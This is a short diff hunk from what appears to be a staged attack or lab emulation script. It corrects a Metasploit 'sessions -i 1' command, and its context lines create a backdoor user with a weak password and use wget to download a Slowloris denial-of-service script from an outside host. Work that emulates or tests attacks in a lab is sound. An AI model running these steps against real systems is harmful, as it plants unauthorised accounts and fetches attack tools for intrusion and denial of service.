@@ -54,7 +54,7 @@ useradd -p "$(openssl passwd -1 password)" cremetest
 # STEP 5 - File Download
 # ============================================================
 
-sessions - 1
+sessions -i 1
 wget http://192.168.56.191:8000/downloads/local_slowloris.py
 
 # ============================================================
